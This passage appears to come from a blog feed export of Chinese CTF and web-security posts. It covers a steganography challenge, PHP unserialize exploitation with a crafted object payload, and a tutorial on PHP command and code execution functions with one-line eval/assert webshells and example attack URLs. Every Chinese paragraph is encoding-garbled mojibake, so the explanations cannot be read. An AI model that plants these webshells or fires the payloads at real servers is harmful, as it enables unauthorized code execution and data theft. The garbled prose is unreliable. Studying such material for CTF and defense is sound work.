href="#The-Wondeful-Wizard" class="headerlink" title="The Wondeful Wizard"></a>The Wondeful Wizard</h2><p>æ‰“å¼€æ–‡ä»¶å°±æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œå›¾ç‰‡æ‰”è¿›stegsloveé‡Œè·‘ä¸€ä¸‹å„é€šé“ï¼Œåœ¨è“è‰²é€šé“å‘ç°ä¸‰è¡Œå­—ç¬¦ä¸²ï¼Œæ˜æ˜¾çš„16è¿›åˆ¶ï¼Œè¯•äº†è¯•è§£å‰ä¸¤ä¸ªå‘ç°æ˜¯fl,äºæ˜¯èœé¸¡çš„æˆ‘æ‰‹æ•²è¿›ä»£ç é‡Œè¿›è¡Œ16è¿›åˆ¶è§£å¯†</p><p>è¿è¡Œç»“æœï¼š</p><p><img src="http://wx1.sinaimg.cn/mw690/006boCb9ly1g5kb70a11oj30ki0kp41e.jpg" alt></p>]]></content>
      
      
      <categories>
          
          <category> WP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WP </tag>
            
            <tag> RSA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åºåˆ—åŒ–ä¸ååºåˆ—åŒ–</title>
      <link href="/2019/03/23/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2019/03/23/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<p>è€ç”Ÿé•¿è°ˆäº†ï¼Œå¯æ˜¯æˆ‘è¿˜æ˜¯ä¸ä¼š</p><a id="more"></a><h2 id="0x01ä¸ºä»€ä¹ˆè¦åºåˆ—åŒ–"><a href="#0x01ä¸ºä»€ä¹ˆè¦åºåˆ—åŒ–" class="headerlink" title="0x01ä¸ºä»€ä¹ˆè¦åºåˆ—åŒ–"></a>0x01ä¸ºä»€ä¹ˆè¦åºåˆ—åŒ–</h2><p>phpå…è®¸ä¿å­˜ä¸€ä¸ªå¯¹è±¡æ–¹ä¾¿ä»¥åé‡ç”¨ï¼Œè¿™ä¸ªè¿‡ç¨‹ç§°ä¸ºåºåˆ—åŒ–ã€‚åœ¨ä¼ é€’å˜é‡çš„è¿‡ç¨‹ä¸­æœ‰å¯èƒ½é‡åˆ°å˜é‡å€¼è·¨è„šæœ¬ä¼ è¾“çš„è¿‡ç¨‹ã€‚æ¯”å¦‚æ–‡ä»¶ç»“æ„æ˜¯è¿™æ ·çš„ï¼š</p><p><img src="http://wx3.sinaimg.cn/mw690/006boCb9ly1g5kawe13ecj305w03nt8i.jpg" alt></p><p>å…¶ä¸­index.phpä»£ç å¦‚ä¸‹ï¼š</p><pre><code>&lt;?php @highlight_file(__FILE__);require_once(&apos;shield.php&apos;);$x = new Shield();isset($_GET[&apos;class&apos;]) &amp;&amp; $g = $_GET[&apos;class&apos;];if (!empty($g)) {    $x = unserialize($g);}echo $x-&gt;readfile();?&gt;</code></pre><p>å¯ä»¥çœ‹å‡ºæ¥$xå°±æ˜¯è·¨è„šæœ¬ä¼ è¾“çš„å˜é‡ã€‚</p><p>å¦‚æœåœ¨ä¸€ä¸ªè„šæœ¬è°ƒç”¨è·¨è„šæœ¬ä¼ è¾“çš„å˜é‡ä¹‹å‰ï¼Œå‰ä¸€ä¸ªåŒ…å«è¯¥å˜é‡çš„è„šæœ¬å·²ç»æ‰§è¡Œç»“æŸæ‰€æœ‰çš„å˜é‡å’Œå†…å®¹éƒ½å·²ç»é‡Šæ”¾æ‰äº†ï¼Œè¿™æ—¶ï¼Œæˆ‘ä»¬ä¸èƒ½è®©å‰ä¸€ä¸ªè„šæœ¬ä¸æ–­å¾ªç¯æ‰§è¡Œç­‰å¾…åé¢çš„è„šæœ¬å»è°ƒç”¨ã€‚serializeå’Œunserialize å°±æ˜¯è§£å†³è¿™ä¸€é—®é¢˜çš„ã€‚serializeå°†å˜é‡è½¬æ¢ä¸ºå­—ç¬¦ä¸²å¹¶ä¸”åœ¨è½¬æ¢è¿‡ç¨‹ä¸­ä¿å­˜å½“å‰å˜é‡çš„å€¼;unserializeåˆ™å°†serializeç”Ÿæˆçš„å­—ç¬¦ä¸²å˜å›æˆå˜é‡ã€‚</p><p>çœ‹ä¸€ä¸ªä¾‹å­ï¼Œç®€å•çš„åˆ†æä¸€ä¸‹ï¼š</p><pre><code>&lt;?phpclass Test{public $age = 0;public $name = &apos;brain&apos;;public function PrintInfo(){    echo &apos;[+]User: &apos;.$this-&gt;name .&apos;: is&apos; . $this-&gt;age .&apos;years old.&apos;;}}$user =  new Test();$user-&gt;age = 20;$user-&gt;name = &apos;Jack&apos;;$user-&gt;PrintInfo();echo serialize($user);?&gt;</code></pre><p>è¾“å‡ºç»“æœå¦‚ä¸‹</p><p><img src="http://wx4.sinaimg.cn/mw690/006boCb9ly1g5kawi4ovpj30p204wdg5.jpg" alt></p><p>ä½¿ç”¨unserializeåˆ™ä¼šä½¿è¿™ä¸²<strong>å­—ç¬¦ä¸²</strong>æ¢å¤æˆ<strong>ç±»å¯¹è±¡</strong>ã€‚</p><h2 id="é­”æ³•å‡½æ•°"><a href="#é­”æ³•å‡½æ•°" class="headerlink" title="é­”æ³•å‡½æ•°"></a>é­”æ³•å‡½æ•°</h2><p>ä¸€å…±æœ‰å‡ ä¸ªé­”æ³•å‡½æ•°éœ€è¦æ³¨æ„ï¼Œè¿™æ˜¯ä¾‹å­ï¼š</p><pre><code>&lt;?phpclass Test{public $variable = &quot;BRAIN&quot;;public $variable1 = &quot;BRAVO&quot;;public function PrintVariable(){    echo $this-&gt;variable . &apos;&lt;br /&gt;&apos;;}public function __construct(){    echo &apos;__construct&apos;.&apos;&lt;br&gt;&apos;;}public function __destruct(){    echo &apos;__destruct&lt;br /&gt;&apos;;}public function __wakeup(){    echo &apos;__wakeup&lt;br /&gt;&apos;;}public function __sleep(){    echo &apos;__sleep&lt;br /&gt;&apos;;    return array(&apos;variable&apos; , &apos;variable1&apos;);}}    $obj = new Test();  //åˆ›å»ºå¯¹è±¡æ—¶è°ƒç”¨__construct$serialized = serialize($obj); //åºåˆ—åŒ–å¯¹è±¡æ—¶è°ƒç”¨__sleepprint(&apos;Serialized: &apos;.$serialized . &apos;&lt;br /&gt;&apos;);$obj2 = unserialize($serialized); //é‡å»ºå¯¹è±¡è°ƒç”¨ __wakeup$obj2-&gt;PrintVariable(); //è°ƒç”¨æ–¹æ³•è¾“å‡ºæ•°æ®//è„šæœ¬ç»“æŸè°ƒç”¨__destruct?&gt;</code></pre><p>è¿™æ˜¯æ‰§è¡Œç»“æœï¼š</p><p><img src="http://wx1.sinaimg.cn/mw690/006boCb9ly1g5kawmc729j30h504a746.jpg" alt></p><p>å¯ä»¥çœ‹åˆ°å„ä¸ªå‡½æ•°çš„æ‰§è¡Œé¡ºåºã€‚</p><h2 id="æ¼æ´äº§ç”Ÿ"><a href="#æ¼æ´äº§ç”Ÿ" class="headerlink" title="æ¼æ´äº§ç”Ÿ"></a>æ¼æ´äº§ç”Ÿ</h2><p>ååºåˆ—åŒ–çš„å±å®³å°±åœ¨äºååºåˆ—åŒ–åçš„å­—ç¬¦ä¸²å‚æ•°è¢«ç”¨æˆ·å¯æ§ï¼Œä»è€Œåœ¨åºåˆ—åŒ–ä¹‹åé€ æˆä¸å¯é¢„æ–™çš„é—®é¢˜ã€‚</p><p>æ‹¿ä¸€é“ctfé¢˜ä¸¾ä¾‹ï¼Œæ–‡ä»¶ç»“æ„å°±æ˜¯æ–‡ç« å¼€å¤´æåˆ°çš„ç»“æ„</p><pre><code>    idnex.php&lt;?php @highlight_file(__FILE__);require_once(&apos;shield.php&apos;);$x = new Shield();isset($_GET[&apos;class&apos;]) &amp;&amp; $g = $_GET[&apos;class&apos;];if (!empty($g)) {    $x = unserialize($g);}echo $x-&gt;readfile();?&gt;shield.php&lt;?php//flag is in pctf.phpclass Shield {    public $file;    function __construct($filename = &apos;&apos;) {        $this -&gt; file = $filename;    }    function readfile() {        if (!empty($this-&gt;file) &amp;&amp; stripos($this-&gt;file,&apos;..&apos;)===FALSE          &amp;&amp; stripos($this-&gt;file,&apos;/&apos;)===FALSE &amp;&amp; stripos($this-&gt;file,&apos;\\&apos;)==FALSE) {            return @file_get_contents($this-&gt;file);        }    }}?&gt;</code></pre><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°index.phpä¸­å…ˆåŒ…å«äº†shield.phpï¼Œç„¶ååˆ›å»ºäº†ä¸€ä¸ªæ–°å¯¹è±¡ï¼Œåœ¨åˆ¤æ–­å®Œgetçš„å˜é‡ä¹‹åè¿›è¡Œååºåˆ—åŒ–ï¼Œéšåè°ƒç”¨readfile()å‡½æ•°ã€‚<br>åœ¨shield.phpä¸­æç¤ºflagåœ¨pctf.phpä¸­ï¼Œéšååœ¨readfile()å‡½æ•°ä¸­å¯¹$fileè¿›è¡Œä¸€å®šè¿‡æ»¤ä¹‹åè¯»æ–‡ä»¶å†…å®¹ã€‚</p><p>æˆ‘ä»¬çš„æƒ³æ³•å°±æ˜¯æ§åˆ¶$fileçš„å€¼ä¸ºpctf.php</p><pre><code>&lt;?php//flag is in pctf.phpclass Shield {    public $file;    function __construct($filename = &apos;&apos;) {        $this -&gt; file = $filename;    }    function readfile() {        if (!empty($this-&gt;file) &amp;&amp; stripos($this-&gt;file,&apos;..&apos;)===FALSE          &amp;&amp; stripos($this-&gt;file,&apos;/&apos;)===FALSE &amp;&amp; stripos($this-&gt;file,&apos;\\&apos;)==FALSE) {            return @file_get_contents($this-&gt;file);        }    }}$a = new Shield(&quot;pctf.php&quot;);echo serialize($a);?&gt;åºåˆ—åŒ–ç»“æœO:6:&quot;Shield&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;pctf.php&quot;;}</code></pre><p>ç„¶åæˆ‘ä»¬å°±å¯ä»¥å°è¯•ä¼ å…¥è¿™ä¸ªå­—ç¬¦ä¸²</p><pre><code>class=O:6:&quot;Shield&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;pctf.php&quot;;}</code></pre><p>å°±å¯ä»¥åœ¨æºç ä¸­çœ‹åˆ°flag.</p><p><img src="http://wx2.sinaimg.cn/mw690/006boCb9ly1g5kawpcjn0j30br08twep.jpg" alt></p><h2 id="ROP-Return-Oriented-programming-é“¾"><a href="#ROP-Return-Oriented-programming-é“¾" class="headerlink" title="ROP(Return-Oriented programming)é“¾"></a>ROP(Return-Oriented programming)é“¾</h2><p>è¿™é“é¢˜çš„æ”»å‡»é“¾æ¯”è¾ƒç®€å•ã€‚å½“æˆ‘ä»¬ä¼ å…¥åºåˆ—åŒ–å®Œæˆçš„å­—ç¬¦ä¸²åï¼Œç¨‹åºå…ˆå¯¹å…¶ååºåˆ—åŒ–ç”Ÿæˆä¸€ä¸ªå¯¹è±¡ï¼Œè¿™æ—¶æ²¡æœ‰_wakeup()ï¼Œ_destruct()é­”æ³•å‡½æ•°ï¼Œåªæ˜¯ç®€å•çš„ååºåˆ—åŒ–ï¼Œä¹‹åè°ƒç”¨readfile()å‡½æ•°è¿›è¡Œ$fileçš„å†…å®¹çš„è¯»å–ï¼Œè€Œæˆ‘ä»¬å°†$fileçš„å€¼è®¾ç½®ä¸ºäº†pctf.phpï¼Œäºæ˜¯æˆ‘ä»¬å¾—åˆ°äº†è¯¥æ–‡ä»¶çš„å†…å®¹ã€‚<br>ååºåˆ—åŒ–æ¼æ´éœ€è¦ä¸¤ä¸ªæ¡ä»¶ï¼š</p><blockquote><p>1.å­˜åœ¨åºåˆ—åŒ–å­—ç¬¦ä¸²çš„å¯æ§åˆ¶ç‚¹æˆ–è€…è¯´æ˜¯è¾“å…¥ç‚¹</p><p>2.å­˜åœ¨å¯ä»¥åˆ©ç”¨çš„é­”æ³•å‡½æ•°</p></blockquote><p>è¿™é“é¢˜ç›®å¯¹é­”æ³•å‡½æ•°çš„åˆ©ç”¨å¥½åƒä¸æ˜¯å¾ˆæ˜æ˜¾.(Îµ=Îµ=Îµ=â”(ã‚œãƒ­ã‚œ;)â”›)</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
            <tag> serialize </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å‘½ä»¤æ‰§è¡Œæ¼æ´(Command Execution)</title>
      <link href="/2019/03/23/Command-Execution/"/>
      <url>/2019/03/23/Command-Execution/</url>
      
        <content type="html"><![CDATA[<p>å½“åº”ç”¨éœ€è¦è°ƒç”¨ä¸€äº›å¤–éƒ¨ç¨‹åºå»å¤„ç†å†…å®¹çš„æƒ…å†µä¸‹ï¼Œå°±ä¼šç”¨åˆ°ä¸€äº›æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„å‡½æ•°ã€‚å¦‚PHPä¸­çš„system,exec,shell_execç­‰ï¼Œå½“ç”¨æˆ·å¯ä»¥æ‰§è¡Œå‡½æ•°ä¸­çš„å‚æ•°æ—¶ï¼Œå°†å¯æ³¨å…¥æ¶æ„ç³»ç»Ÿå‘½ä»¤åˆ°æ­£å¸¸å‘½ä»¤ä¸­ï¼Œé€ æˆå‘½ä»¤æ‰§è¡Œæ¼æ´ã€‚</p><a id="more"></a><h2 id="æ¼æ´æ¦‚å¿µ"><a href="#æ¼æ´æ¦‚å¿µ" class="headerlink" title="æ¼æ´æ¦‚å¿µ"></a>æ¼æ´æ¦‚å¿µ</h2><p>å½“åº”ç”¨éœ€è¦è°ƒç”¨ä¸€äº›å¤–éƒ¨ç¨‹åºå»å¤„ç†å†…å®¹çš„æƒ…å†µä¸‹ï¼Œå°±ä¼šç”¨åˆ°ä¸€äº›æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„å‡½æ•°ã€‚å¦‚PHPä¸­çš„system,exec,shell_execç­‰ï¼Œå½“ç”¨æˆ·å¯ä»¥æ‰§è¡Œå‡½æ•°ä¸­çš„å‚æ•°æ—¶ï¼Œå°†å¯æ³¨å…¥æ¶æ„ç³»ç»Ÿå‘½ä»¤åˆ°æ­£å¸¸å‘½ä»¤ä¸­ï¼Œé€ æˆå‘½ä»¤æ‰§è¡Œæ¼æ´ã€‚</p><h2 id="è¦åŒºåˆ«å‘½ä»¤æ‰§è¡Œæ¼æ´å’Œä»£ç æ‰§è¡Œæ¼æ´"><a href="#è¦åŒºåˆ«å‘½ä»¤æ‰§è¡Œæ¼æ´å’Œä»£ç æ‰§è¡Œæ¼æ´" class="headerlink" title="è¦åŒºåˆ«å‘½ä»¤æ‰§è¡Œæ¼æ´å’Œä»£ç æ‰§è¡Œæ¼æ´"></a>è¦åŒºåˆ«å‘½ä»¤æ‰§è¡Œæ¼æ´å’Œä»£ç æ‰§è¡Œæ¼æ´</h2><p><strong>å‘½ä»¤æ‰§è¡Œæ¼æ´ç›´æ¥è°ƒç”¨æ“ä½œç³»ç»Ÿå‘½ä»¤</strong></p><p><strong>åŸç†</strong>ï¼šåœ¨æ“ä½œç³»ç»Ÿä¸­â€&amp;,|,||â€éƒ½å¯ä»¥ä½œä¸ºå‘½ä»¤è¿æ¥ç¬¦ä½¿ç”¨ï¼Œç”¨æˆ·é€šè¿‡æµè§ˆå™¨æäº¤æ‰§è¡Œå‘½ä»¤ï¼Œç”±äºæœåŠ¡å™¨ç«¯æ²¡æœ‰é’ˆå¯¹æ‰§è¡Œå‡½æ•°åšè¿‡æ»¤ï¼Œå¯¼è‡´åœ¨æ²¡æœ‰æŒ‡å®šç»å¯¹è·¯å¾„çš„æƒ…å†µä¸‹å°±æ‰§è¡Œå‘½ä»¤</p><p><strong>ä»£ç æ‰§è¡Œæ¼æ´é æ‰§è¡Œè„šæœ¬ä»£ç è°ƒç”¨ç³»ç»Ÿå‘½ä»¤</strong></p><p><strong>åŸç†</strong>ï¼šåº”ç”¨æœ‰æ—¶ç°éœ€è¦è°ƒç”¨ä¸€äº›æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„å‡½æ•°ï¼Œå¦‚PHPä¸­çš„system,exec,shell_exec,passthru,popen,proc_popenç­‰ï¼Œå½“ç”¨æˆ·èƒ½æ§åˆ¶è¿™äº›å‡½æ•°ä¸­çš„å‚æ•°æ—¶ï¼Œå°±å¯ä»¥å°†æ¶æ„ç³»ç»Ÿå‘½ä»¤æ‹¼æ¥åˆ°æ­£å¸¸å‘½ä»¤ä¸­ï¼Œä»è€Œæ‰§è¡Œæ”»å‡»ã€‚</p><h2 id="linuxçš„ç‰¹æ®Šå­—ç¬¦"><a href="#linuxçš„ç‰¹æ®Šå­—ç¬¦" class="headerlink" title="linuxçš„ç‰¹æ®Šå­—ç¬¦"></a>linuxçš„ç‰¹æ®Šå­—ç¬¦</h2><ol><li><p>â€˜;â€™çš„ç”¨æ³•</p><p> å…ˆæ‰§è¡Œå®ƒä¹‹å‰çš„å‘½ä»¤ï¼ŒçŸ¥é“å‰é¢çš„å‘½ä»¤æ‰§è¡Œå®Œï¼ˆæ— è®ºå¯¹ä¸é”™ï¼‰å°±ç«‹å³æ‰§è¡Œåé¢çš„å‘½ä»¤ã€‚</p></li><li><p>â€˜|â€™çš„ç”¨æ³•</p><p> ä¸Šä¸€æ¡å‘½ä»¤çš„è¾“å‡ºï¼Œä½œä¸ºä¸‹ä¸€æ¡å‘½ä»¤çš„å‚æ•°</p></li><li><p>â€˜&amp;&amp;â€™çš„ç”¨æ³•</p><p> åªç”¨å‰é¢çš„å‘½ä»¤æ‰§è¡ŒæˆåŠŸï¼Œæ‰èƒ½æ‰§è¡Œåé¢çš„å‘½ä»¤</p></li></ol><h2 id="å¸¸è§å±é™©å‡½æ•°"><a href="#å¸¸è§å±é™©å‡½æ•°" class="headerlink" title="å¸¸è§å±é™©å‡½æ•°"></a>å¸¸è§å±é™©å‡½æ•°</h2><p>8/20/2019 7:32:16 PM </p><h3 id="phpä»£ç æ‰§è¡Œ"><a href="#phpä»£ç æ‰§è¡Œ" class="headerlink" title="phpä»£ç æ‰§è¡Œ"></a>phpä»£ç æ‰§è¡Œ</h3><p>eval()</p><blockquote><p>eval â€” æŠŠå­—ç¬¦ä¸²ä½œä¸ºPHPä»£ç æ‰§è¡Œ</p></blockquote><pre><code>mixed eval( string $code)&lt;?php    eval($_GET[&apos;a&apos;]);    ?&gt;</code></pre><p>å¸¸è§çš„ä¸€å¥è¯æœ¨é©¬ï¼Œè®¿é—®ï¼š</p><pre><code>http://xxx/php_cmd.php?a=phpinfo();</code></pre><p>å¾—åˆ°phpinfoé¡µé¢ã€‚è¿™é‡Œæ³¨æ„å°†å­—ç¬¦ä¸²å½“ä½œcodeæ‰§è¡Œï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬ä¼ å…¥çš„å­—ç¬¦ä¸²è¦ç¬¦åˆphpè§„èŒƒï¼Œåˆ†å·ä¸èƒ½å¿˜ã€‚</p><p>assert()</p><blockquote><p>assert â€” æ£€æŸ¥ä¸€ä¸ªæ–­è¨€æ˜¯å¦ä¸º FALSE</p></blockquote><p>php5</p><pre><code>bool assert( mixed $assertion[, string $description] )</code></pre><p>php7</p><pre><code>bool assert( mixed $assertion[, Throwable $exception] )</code></pre><blockquote><p>å¦‚æœ assertion æ˜¯å­—ç¬¦ä¸²ï¼Œå®ƒå°†ä¼šè¢« assert() å½“åš PHP ä»£ç æ¥æ‰§è¡Œã€‚ assertion æ˜¯å­—ç¬¦ä¸²çš„ä¼˜åŠ¿æ˜¯å½“ç¦ç”¨æ–­è¨€æ—¶å®ƒçš„å¼€é”€ä¼šæ›´å°ï¼Œå¹¶ä¸”åœ¨æ–­è¨€å¤±è´¥æ—¶æ¶ˆæ¯ä¼šåŒ…å« assertion è¡¨è¾¾å¼ã€‚è¿™æ„å‘³ç€å¦‚æœä½ ä¼ å…¥äº† boolean çš„æ¡ä»¶ä½œä¸º assertionï¼Œè¿™ä¸ªæ¡ä»¶å°†ä¸ä¼šæ˜¾ç¤ºä¸ºæ–­è¨€å‡½æ•°çš„å‚æ•°ï¼›åœ¨è°ƒç”¨ä½ å®šä¹‰çš„ assert_options() å¤„ç†å‡½æ•°æ—¶ï¼Œæ¡ä»¶ä¼šè½¬æ¢ä¸ºå­—ç¬¦ä¸²ï¼Œè€Œå¸ƒå°”å€¼ FALSE ä¼šè¢«è½¬æ¢æˆç©ºå­—ç¬¦ä¸²ã€‚ </p></blockquote><pre><code>&lt;?php    assert($_GET[&apos;a&apos;]);    ?&gt;</code></pre><p>æ­¤æ—¶è®¿é—®phpinfo()ä¸ç”¨åŠ åˆ†å·ä¹Ÿèƒ½å¾—åˆ°å¯¹åº”é¡µé¢ã€‚</p><p>preg_replace</p><blockquote><pre><code>preg_replace â€” æ‰§è¡Œä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼çš„æœç´¢å’Œæ›¿æ¢</code></pre></blockquote><pre><code>mixed preg_replace( mixed $pattern, mixed $replacement, mixed $subject[, int $limit = -1[, int &amp;$count]] )</code></pre><p>æœç´¢subjectä¸­åŒ¹é…patternçš„éƒ¨åˆ†ï¼Œä»¥replacementè¿›è¡Œæ›¿æ¢ã€‚</p><p>æœç´¢subjectä¸­åŒ¹é…patternçš„éƒ¨åˆ†ï¼Œ ä»¥replacementè¿›è¡Œæ›¿æ¢ã€‚å½“ä½¿ç”¨è¢«å¼ƒç”¨çš„ e ä¿®é¥°ç¬¦æ—¶, è¿™ä¸ªå‡½æ•°ä¼šè½¬ä¹‰ä¸€äº›å­—ç¬¦å³(ï¼šâ€™ã€â€ã€ \ å’Œ NULL) ç„¶åè¿›è¡Œåå‘å¼•ç”¨æ›¿æ¢ï¼Œåœ¨å®Œæˆæ›¿æ¢åï¼Œå¼•æ“ä¼šå°†ç»“æœå­—ç¬¦ä¸²ä½œä¸ºphpä»£ç ä½¿ç”¨evalæ–¹å¼è¿›è¡Œè¯„ä¼°å¹¶å°†è¿”å›å€¼ä½œä¸ºæœ€ç»ˆå‚ä¸æ›¿æ¢çš„å­—ç¬¦ä¸²ã€‚å¦‚æœè¦åœ¨replacement ä¸­ä½¿ç”¨åæ–œçº¿ï¼Œå¿…é¡»ä½¿ç”¨4ä¸ª(â€œ\\â€œï¼Œè¯‘æ³¨ï¼šå› ä¸ºè¿™é¦–å…ˆæ˜¯phpçš„å­—ç¬¦ä¸²ï¼Œç»è¿‡è½¬ä¹‰åï¼Œæ˜¯ä¸¤ä¸ªï¼Œå†ç»è¿‡æ­£åˆ™è¡¨è¾¾å¼å¼•æ“åæ‰è¢«è®¤ä¸ºæ˜¯ä¸€ä¸ªåŸæ–‡åæ–œçº¿)ã€‚ </p><blockquote><p>PHP 5.5.0 èµ·ï¼Œ ä¼ å…¥ â€œ\eâ€ ä¿®é¥°ç¬¦çš„æ—¶å€™ï¼Œä¼šäº§ç”Ÿä¸€ä¸ª E_DEPRECATED é”™è¯¯ï¼› PHP 7.0.0 èµ·ï¼Œä¼šäº§ç”Ÿ E_WARNING é”™è¯¯ï¼ŒåŒæ—¶ â€œ\eâ€ ä¹Ÿæ— æ³•èµ·æ•ˆã€‚</p></blockquote><p>call_user_func()</p><blockquote><p>call_user_func â€” æŠŠç¬¬ä¸€ä¸ªå‚æ•°ä½œä¸ºå›è°ƒå‡½æ•°è°ƒç”¨</p></blockquote><pre><code>mixed call_user_func( callable $callback[, mixed $parameter[, mixed $...]] )&lt;?php    call_user_func($_GET[&apos;a&apos;],$_GET[&apos;b&apos;]);?&gt;</code></pre><p>è®¿é—®ï¼š</p><pre><code>http://xxx/php_cmd.php?a=assert&amp;b=phpinfo()</code></pre><p>call_user_func_array()</p><blockquote><p>call_user_func_array â€” è°ƒç”¨å›è°ƒå‡½æ•°ï¼Œå¹¶æŠŠä¸€ä¸ªæ•°ç»„å‚æ•°ä½œä¸ºå›è°ƒå‡½æ•°çš„å‚æ•°</p></blockquote><pre><code>mixed call_user_func_array( callable $callback, array $param_arr)</code></pre><p>æŠŠç¬¬ä¸€ä¸ªå‚æ•°ä½œä¸ºå›è°ƒå‡½æ•°ï¼ˆcallbackï¼‰è°ƒç”¨ï¼ŒæŠŠå‚æ•°æ•°ç»„ä½œï¼ˆparam_arrï¼‰ä¸ºå›è°ƒå‡½æ•°çš„çš„å‚æ•°ä¼ å…¥ã€‚ </p><pre><code>&lt;?php    call_user_func_array($_GET[&apos;a&apos;],$_GET[&apos;b&apos;]);?&gt;</code></pre><p>è®¿é—®ï¼š</p><pre><code>http://xxx/php_cmd.php?a=assert&amp;b[]=phpinfo()</code></pre><p>create_function</p><blockquote><p>create_function â€” Create an anonymous (lambda-style) function</p></blockquote><pre><code>string create_function( string $args, string $code)</code></pre><p>Creates an anonymous function from the parameters passed, and returns a unique name for it.<br>ç¬¬ä¸€ä¸ªå‚æ•°argsæ˜¯åé¢å®šä¹‰å‡½æ•°çš„å‚æ•°ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯å‡½æ•°çš„ä»£ç ã€‚</p><blockquote><p>This function internally performs an eval() and as such has thesame security issues as eval(). </p></blockquote><pre><code>&lt;?php    $a = $_GET[&apos;c&apos;];    $b = create_function(&apos;$a&apos;,&quot;echo $a&quot;);    $b(&apos;&apos;);?&gt;</code></pre><p>è®¿é—®</p><pre><code>http://xxx/php_cmd.php?c=phpinfo();</code></pre><p>array_map</p><blockquote><p>array_map â€” ä¸ºæ•°ç»„çš„æ¯ä¸ªå…ƒç´ åº”ç”¨å›è°ƒå‡½æ•° </p></blockquote><pre><code>array array_map( callable $callback, array $array1[, array $...] )</code></pre><p>array_map()ï¼šè¿”å›æ•°ç»„ï¼Œæ˜¯ä¸º array1 æ¯ä¸ªå…ƒç´ åº”ç”¨ callbackå‡½æ•°ä¹‹åçš„æ•°ç»„ã€‚ callback å‡½æ•°å½¢å‚çš„æ•°é‡å’Œä¼ ç»™ array_map() æ•°ç»„æ•°é‡ï¼Œä¸¤è€…å¿…é¡»ä¸€æ ·ã€‚ </p><pre><code>&lt;?php    $array = array(0,1,2,3,4,5);    array_map($_GET[&apos;a&apos;],$array);?&gt;</code></pre><p>è®¿é—®</p><pre><code>http://xxx/php_cmd.php?a=phpinfo</code></pre><p>æ²¡æœ‰åˆ†å·<code>;</code>ä¹Ÿæ²¡æœ‰æ‹¬å·<code>()</code>ï¼åŒæ—¶ä»è¿”å›ç»“æœä¹Ÿå¯ä»¥çœ‹å‡ºarrayä¸­çš„æ•°ç»„æ•°é‡å†³å®šäº†è¿”å›å€¼çš„æ•°é‡ã€‚</p><h3 id="ç³»ç»Ÿå‘½ä»¤æ‰§è¡Œ"><a href="#ç³»ç»Ÿå‘½ä»¤æ‰§è¡Œ" class="headerlink" title="ç³»ç»Ÿå‘½ä»¤æ‰§è¡Œ"></a>ç³»ç»Ÿå‘½ä»¤æ‰§è¡Œ</h3><p>system()</p><blockquote><p>system â€” æ‰§è¡Œå¤–éƒ¨ç¨‹åºï¼Œå¹¶ä¸”æ˜¾ç¤ºè¾“å‡º</p></blockquote><pre><code>string system( string $command[, int &amp;$return_var] )</code></pre><blockquote><p>åŒ C ç‰ˆæœ¬çš„ system() å‡½æ•°ä¸€æ ·ï¼Œæœ¬å‡½æ•°æ‰§è¡Œ command å‚æ•°æ‰€æŒ‡å®šçš„å‘½ä»¤ï¼Œå¹¶ä¸”è¾“å‡ºæ‰§è¡Œç»“æœã€‚ å¦‚æœæä¾› return_var å‚æ•°ï¼Œ åˆ™å¤–éƒ¨å‘½ä»¤æ‰§è¡Œåçš„è¿”å›çŠ¶æ€å°†ä¼šè¢«è®¾ç½®åˆ°æ­¤å˜é‡ä¸­ã€‚</p><p>å¦‚æœ PHP è¿è¡Œåœ¨æœåŠ¡å™¨æ¨¡å—ä¸­ï¼Œ system() å‡½æ•°è¿˜ä¼šå°è¯•åœ¨æ¯è¡Œè¾“å‡ºå®Œæ¯•ä¹‹åï¼Œè‡ªåŠ¨åˆ·æ–° web æœåŠ¡å™¨çš„è¾“å‡ºç¼“å­˜ã€‚ </p></blockquote><pre><code>&lt;?php    system(&apos;whoami&apos;);?&gt;</code></pre><p>passthru()</p><blockquote><p>passthru â€” æ‰§è¡Œå¤–éƒ¨ç¨‹åºå¹¶ä¸”æ˜¾ç¤ºåŸå§‹è¾“å‡º</p></blockquote><pre><code>void passthru( string $command[, int &amp;$return_var] )</code></pre><blockquote><p>åŒ exec() å‡½æ•°ç±»ä¼¼ï¼Œ passthru() å‡½æ•°ä¹Ÿæ˜¯ç”¨æ¥æ‰§è¡Œå¤–éƒ¨å‘½ä»¤ï¼ˆcommandï¼‰çš„ã€‚å½“æ‰€æ‰§è¡Œçš„ Unix å‘½ä»¤è¾“å‡ºäºŒè¿›åˆ¶æ•°æ®ï¼Œå¹¶ä¸”éœ€è¦ç›´æ¥ä¼ é€åˆ°æµè§ˆå™¨çš„æ—¶å€™ï¼Œéœ€è¦ç”¨æ­¤å‡½æ•°æ¥æ›¿ä»£ exec() æˆ– system() å‡½æ•°ã€‚å¸¸ç”¨æ¥æ‰§è¡Œè¯¸å¦‚ pbmplus ä¹‹ç±»çš„å¯ä»¥ç›´æ¥è¾“å‡ºå›¾åƒæµçš„å‘½ä»¤ã€‚é€šè¿‡è®¾ç½® Content-type ä¸º image/gifï¼Œç„¶åè°ƒç”¨ pbmplus ç¨‹åºè¾“å‡º gif æ–‡ä»¶ï¼Œå°±å¯ä»¥ä» PHP è„šæœ¬ä¸­ç›´æ¥è¾“å‡ºå›¾åƒåˆ°æµè§ˆå™¨ã€‚<br>å¦‚æœæä¾› return_var å‚æ•°ï¼Œ Unix å‘½ä»¤çš„è¿”å›çŠ¶æ€ä¼šè¢«è®°å½•åˆ°æ­¤å‚æ•°ã€‚ </p></blockquote><pre><code>&lt;?php    